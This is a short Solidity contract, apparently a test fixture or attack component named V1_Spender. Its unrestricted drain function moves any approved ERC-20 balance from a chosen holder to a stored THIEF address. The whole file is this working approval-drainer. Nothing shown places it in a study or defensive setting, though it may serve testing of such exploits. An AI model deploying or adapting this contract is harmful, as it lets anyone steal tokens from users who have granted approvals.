// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract V1_Spender {
    IERC20Like public immutable TOKEN;
    address public immutable THIEF;

    constructor(address token_, address thief_) {
        TOKEN = IERC20Like(token_);
        THIEF = thief_;
    }

    function drain(address from, uint256 amount) external {
        require(TOKEN.transferFrom(from, THIEF, amount), "TF");
    }
}
